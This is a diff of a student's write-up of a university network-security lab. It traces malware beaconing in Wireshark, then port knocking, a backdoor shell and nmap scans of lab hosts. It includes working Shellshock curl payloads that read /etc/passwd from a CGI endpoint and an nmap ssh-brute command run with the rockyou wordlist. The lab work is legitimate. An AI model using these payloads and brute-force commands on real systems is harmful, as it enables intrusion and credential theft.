@@ -17,6 +17,7 @@ After a while, I filtered all HTTP traffic and ...
 TODO
 
 I started going through the packets randomly. After a while I noticed some SSL traffic. The info to these packets was: `Continuation Data`, which I found peculiar, so I looked into it. The computer was communicating with `37.48.125.108`. I pasted this address into virustotal and got a positive scan. After filtering this ip address (`ip.addr == 37.48.125.108`) I noticed that these requests are repeating periodically. 
+
 ```
 01:41:27.9
 01:46:28.8
@@ -24,13 +25,14 @@ I started going through the packets randomly. After a while I noticed some SSL t
 01:56:29.8
 02:01:30.3
 ```
-I calculated the difference to be about 300 seconds. So that might be the answer to the second question. In one of the packets, there was something, that resembled the name of the computer: `robert-PC`
+
+I calculated the difference to be about `300` seconds. So that might be the answer to the second question. In one of the packets, there was something, that resembled the name of the computer: `robert-PC`
 
 I counted all the SSL packets that went from `10.0.2.15` to `37.48.125.108`, there were 8 packets. But there were another TCP packets. I did not know, whether I should count them in, or not. Counting all the packets, regardless of the protocol, there were 22 packets: 8 SSL requests, 8 TCP answers 2 tcp connections that got acknowledged.
 
 I tried to upload the answers I got, but there were only 3/4 correct. After checking every answer, I ruled out the last three questions. It seemed like I got the name of the computer wrong. I tried a couple of alternatives: `robert`, `robert-pc` and finally got further when I entered: `ROBERT-PC`. I got this as a response:
 
-```
+```{shell}
 class@ubuntu8:~$ ncat 192.168.1.167 9292
 
 (((((((((((####(########################################%%#(##/##(#####%##(###%######%###/#(#/####(#%#%%##################################(##(#((((((((((((((((
@@ -115,7 +117,8 @@ The string I got as a hint, was probably encoded using base64. I thought of that
 After decoding I got: `37 30 30 30 2c 38 30 30 30 2c 39 30 30 30 2c 31 30 30 30 30`. After converting from hexadecimal, I got: `7000,8000,9000,10000` At the moment, I was unsure, what these numbers might mean. They could be port numbers, they could be anything.
 
 I tried to run nmap from my machine, scanning the whole network for these ports: 
-```
+
+```{shell}
 nmap -sS -n -v 192.168.1.3-255 -p 7000,8000,9000,10000`
 ```
 
@@ -130,7 +133,7 @@ On `192.168.1.167:8000` there is flag server for assignment 3. I did not think t
 
 There was a tutorial of using exploit called `Kung-Fu`, which would open some port and then allow to anybody using that port to input shell commands. In the tutorial, they used port 9000 to do this. I connected using nc to the machine and input a command, just to test, whether I would get an answer:
 
-```
+```{shell}
 200~root@ubuntu8:~# nc 192.168.1.193 9000
 whoami
 moriarty
@@ -141,7 +144,7 @@ Well, this looked familiar. Going through the previous assignments, I found out,
 
 I tried to scan the machine designated to this task:
 
-```
+```{shell}
 root@ubuntu8:~# nmap -sS -n -v 192.168.1.167 -p 7000,8000,9000,10000
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 10:32 CET
@@ -169,7 +172,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
 
 As previously stated, port 8000 was used for upload of solved assignment 3, so I excluded it from the list. The other ports were filtered. This means that probably the firewall is blocking them. To get through, I could try some exploit. Searching through the internet got me to the Port-knocking technique. It seemed that nmap can do port knocking, so I tried to do that.
 
-```
+```{shell}
 root@ubuntu8:~# nmap -Pn --host-timeout 201 --max-retries 10 -p 7000,9000,10000 192.168.1.167
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 10:38 CET
@@ -187,11 +190,12 @@ Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
 
 However I did not notice anything happening. Back to the drawing board.
 Starting to get desperate, I looked back at the hints provided earlier. There was this peculiar number: `3232235903`. I spent some time using CyberChef to somehow decode this number. I tried various date converters and compression algorithms. Then I noticed a Networking tab. As the other hint was probably port numbers, there might be something of interest there. Going through these decoders, I found Change IP format node and used it. Finally I got to something promising: 
-[cyber_chef_ip_decode](cyber_chef_ip_decode.png)
-. 
+
+![cyber_chef_ip_decode](cyber_chef_ip_decode.png) 
 
 I did a quick scan of the `192.168.1.127` address:
-```
+
+```{shell}
 root@ubuntu8:~# nmap -sS -n -v 192.168.1.127
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 10:59 CET
@@ -227,7 +231,8 @@ I connected using nc to ports:
 * 8081 - There was some HTTP service.
 
 Next, I focused on the HTTP service:
-```
+
+```{shell}
 root@ubuntu8:~# ncat 192.168.1.127 8081
 GET / HTTP/1.1
 
@@ -256,7 +261,7 @@ Content-Length: 348
 
 I did not think this would help me, so I moved on. I tried scanning ports `7000,8000,9000,10000` again:
 
-```
+```{shell}
 root@ubuntu8:~# nmap -sS -n -v 192.168.1.127 -p 7000,8000,9000,10000
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 11:08 CET
@@ -283,13 +288,13 @@ Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
 
 All of them are filtered. Again, I will try to use the port-knocking technique:
 
-```
+```{shell}
 nmap -Pn --host-timeout 201 --max-retries 0 -p 7000,8000,9000,10000 192.168.1.127
 ```
 
 Nothing of interest happened. I tried doing it again. Nothing changed. I ran the port scan again, nothing changed. I started going insane. I scanned all the ports on the machine, but I did not find anything that would interest me. I port knocked those ports one by one. I even tried to `nc` on them one by one, nothing worked. However, when I ran the port scan again, to see whether something has changed, I saw a new port opened, which was not previously there:
 
-```
+```{shell}
 root@ubuntu8:~# nmap -sS -n -v 192.168.1.127
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-11 11:14 CET
@@ -320,7 +325,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
            Raw packets sent: 3005 (132.188KB) | Rcvd: 19 (820B)
 ```
 
-```
+```{shell}
 root@ubuntu8:~# ncat 192.168.1.127 8080
 GET / HTTP/1.1
 
@@ -396,7 +401,7 @@ So there is a web service that is vulnerable to a specific type of attack, that 
 
 I ran the attack command:
 
-```
+```{shell}
 root@ubuntu8:~/bonus/vaas-cve-2014-6271# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://192.168.1.127:8080/cgi-bin/stats
 
 root:x:0:0:root:/root:/bin/bash
@@ -422,7 +427,7 @@ libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 
 So these are the contents of the passwd file on the `192.168.1.127` machine. Running the `whoami` command on the target machine told me that I was logged in as the `www-data` user. I looked around the filesystem:
 
-```
+```{shell}
 root@ubuntu8:~# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls;'" http://192.168.1.127:8080/cgi-bin/stats
 
 stats
@@ -533,7 +538,7 @@ daf1ab1e200d6ed16dda7f2eacf6ac4af8f204275527a0ee79267c79faa7855ea81680396896564d
 
 So I found something that looks like some cipher. Judging by the hint on the first line, it is gotta be some symetric cipher. The first part is a regex, that will select the first 3 letters of some alphanumeric string. Going through the list of various symmetric ciphers I noticed that a great deal of them were 3-letters. This might have been the purpose of this hint. I had a feeling, that the passphrase for the cipher might be my personal token, because the cipher was in a file with my name. I tried various three-lettered symmetric c ciphers, but most of them needed something else than the passcode. After a while I tried the RC4 cipher and got a deciphered string:
 
-[codeChef_rc4_done](codeChef_rc4_done.png)
+![codeChef_rc4_done](codeChef_rc4_done.png)
 
 ```
 Hello there! This is the end of stage 2!There are many Elves on the shelf, but Tinsel is special. Instructions for the next stage are in home directory of this elf!
@@ -541,7 +546,7 @@ Hello there! This is the end of stage 2!There are many Elves on the shelf, but T
 
 I immediately started searching the filesystem for any trace of user Tinsel, but there was nothing I could use. So I tried to use brute force on the ssh port 22. First, I needed to get wordlist for the brute force. I used the rockyou wordlist. I shuffled it using a python script:
 
-```
+```{python}
 with open("passwords.txt", "r") as i:
 	strings = i.readlines()
 
@@ -553,13 +558,13 @@ with open("passwords.txt", "r") as i:
 
 then I started the nmap brute-force scan:
 
-```
+```{shell}
 nmap -sS -sV -v -n 192.168.1.127 --min-parallelism 150 --min-rate 1000 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords_shuffled.txt,brute.firstonly=true,unpwdb.timelimit=0
 ```
 
 And let I let this run for a while. However, I did not get any result, even after going through 40 thousand passwords. As the bruteforce would take ages, I ran it in parallel in six screens. Finally after 4 hours, I got a hit!
 
-```
+```{shell}
 Nmap scan report for 192.168.1.127
 Host is up (0.00073s latency).
 
@@ -586,7 +591,7 @@ Nmap done: 1 IP address (1 host up) scanned in 534.49 seconds
 
 After logging to the ssh with those credentials, I got this as a result:
 
-```
+```{shell}
 class@ubuntu8:~/bonus$ ssh tinsel@192.168.1.127 -p 22
 tinsel@192.168.1.127's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-72-generic x86_64)
